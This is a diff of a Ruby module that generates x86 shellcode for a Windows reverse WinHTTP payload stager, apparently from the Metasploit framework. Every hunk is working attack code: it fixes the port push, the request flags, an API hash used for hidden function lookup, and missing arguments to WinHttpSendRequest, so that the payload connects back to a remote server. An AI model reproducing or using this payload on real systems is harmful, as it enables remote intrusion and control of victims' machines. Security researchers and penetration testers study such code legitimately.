@@ -159,7 +159,7 @@ module Payload::Windows::ReverseWinHttp
 
       WinHttpConnect:
         push ebx               ; Reserved (NULL) [4]
-        push.i32 #{opts[:port]}; Port [3]
+        push #{opts[:port]}    ; Port [3]
         call got_server_uri    ; Double call to get pointer for both server_uri and
       server_uri:              ; server_host; server_uri is saved in EDI for later
         db #{encoded_url}
@@ -170,7 +170,7 @@ module Payload::Windows::ReverseWinHttp
 
       WinHttpOpenRequest:
 
-        push.i32 #{http_open_flags}
+        push.i32 #{"0x%.8x" % http_open_flags}
         push ebx               ; AcceptTypes (NULL) [6]
         push ebx               ; Referrer (NULL) [5]
         push ebx               ; Version (NULL)  [4]
@@ -198,7 +198,7 @@ module Payload::Windows::ReverseWinHttp
           push eax               ; &buffer
           push.i8 31             ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
           push esi               ; hHttpRequest
-          push 0xd83c501e        ; hash( "winhttp.dll", "WinHttpSetOption" )
+          push 0xCE9D58D3        ; hash( "winhttp.dll", "WinHttpSetOption" )
           call ebp
         ^
     end
@@ -207,8 +207,8 @@ module Payload::Windows::ReverseWinHttp
       send_request:
 
       WinHttpSendRequest:
-                               ; Context [7]
-                               ; TotalLength [6]
+        push ebx               ; Context [7]
+        push ebx               ; TotalLength [6]
         push ebx               ; OptionalLength (0) [5]
         push ebx               ; Optional (NULL) [4]
         push ebx               ; HeadersLength (0) [3]
